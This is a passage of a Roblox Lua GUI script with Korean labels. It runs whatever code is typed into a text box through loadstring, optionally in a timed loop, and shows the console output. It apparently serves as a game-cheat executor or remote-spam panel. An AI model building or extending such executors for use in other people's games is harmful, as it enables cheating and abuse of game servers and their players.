end)

local bf = false
local bg, bh = 0.01, 1.0
local bi = 0.1

X.InputBegan:Connect(function(bj)
    if bj.UserInputType == Enum.UserInputType.MouseButton1 or bj.UserInputType == Enum.UserInputType.Touch then bf = true end
end)

c.InputEnded:Connect(function(bj)
    if bj.UserInputType == Enum.UserInputType.MouseButton1 or bj.UserInputType == Enum.UserInputType.Touch then bf = false end
end)

c.InputChanged:Connect(function(bj)
    if bf and (bj.UserInputType == Enum.UserInputType.MouseMovement or bj.UserInputType == Enum.UserInputType.Touch) then
        local bk = math.clamp((bj.Position.X - V.AbsolutePosition.X) / V.AbsoluteSize.X, 0, 1)
        W.Size = UDim2.new(bk, 0, 1, 0)
        bi = math.floor((bg + (bh - bg) * bk) * 100) / 100
        if bi < 0.01 then bi = 0.01 end
        U.Text = "대기: " .. tostring(bi) .. "s"
    end
end)

local function bl()
    local bm = R_remote.Text
    if bm ~= "" then
        local bn, bo = loadstring(bm)
        if bn then pcall(bn) end
    end
end

Z.MouseButton1Click:Connect(bl)

local bp = false
_.MouseButton1Click:Connect(function()
    bp = not bp
    if bp then
        _.Text = "중지"
        b:Create(_, g, {BackgroundColor3 = Color3.fromRGB(235, 87, 87), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        task.spawn(function()
            while bp do bl() task.wait(bi) end
        end)
    else
        _.Text = "루프"
        b:Create(_, g, {BackgroundColor3 = Color3.fromRGB(240, 240, 240), TextColor3 = Color3.fromRGB(20, 20, 20)}):Play()
    end
end)

a4.MouseButton1Click:Connect(function()
    for bq, br in pairs(a1:GetChildren()) do
        if br:IsA("Frame") then br:Destroy() end
    end
end)

d.MessageOut:Connect(function(bs, bt)
    local logCard = Instance.new("Frame")
    logCard.Size = UDim2.new(1, 0, 0, 20)
    logCard.BackgroundTransparency = 0.8
    logCard.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    logCard.BorderSizePixel = 0
    logCard.Parent = a1
    Instance.new("UICorner", logCard).CornerRadius = UDim.new(0, 4)

    local logText = Instance.new("TextLabel")
    logText.Size = UDim2.new(1, -10, 1, 0)
    logText.Position = UDim2.new(0, 8, 0, 0)
    logText.BackgroundTransparency = 1
    logText.Font = Enum.Font.Code
    logText.TextSize = 11
    logText.TextXAlignment = Enum.TextXAlignment.Left

    local timeStr = os.date("[%H:%M:%S] ")
    logText.Text = timeStr .. bs

    if bt == Enum.MessageType.MessageOutput then
        logText.TextColor3 = Color3.fromRGB(210, 210, 215)
    elseif bt == Enum.MessageType.MessageWarning then
        logText.TextColor3 = Color3.fromRGB(245, 200, 70)
    elseif bt == Enum.MessageType.MessageError then
        logText.TextColor3 = Color3.fromRGB(240, 80, 80)
    elseif bt == Enum.MessageType.MessageInfo then
        logText.TextColor3 = Color3.fromRGB(90, 180, 240)
    end
    logText.Parent = logCard
    
    
    task.defer(function()
        a1.CanvasPosition = Vector2.new(0, a1.AbsoluteCanvasSize.Y)
    end)
end)

i.Size = UDim2.new(0, 0, 0, 0)
local introTween = b:Create(i, h, {Size = UDim2.new(0.9, 0, 0.85, 0), Position = mainPos})
introTween:Play()
introTween.Completed:Connect(function()
    l.Visible = true
    y.Visible = true
    J.Visible = true
end)
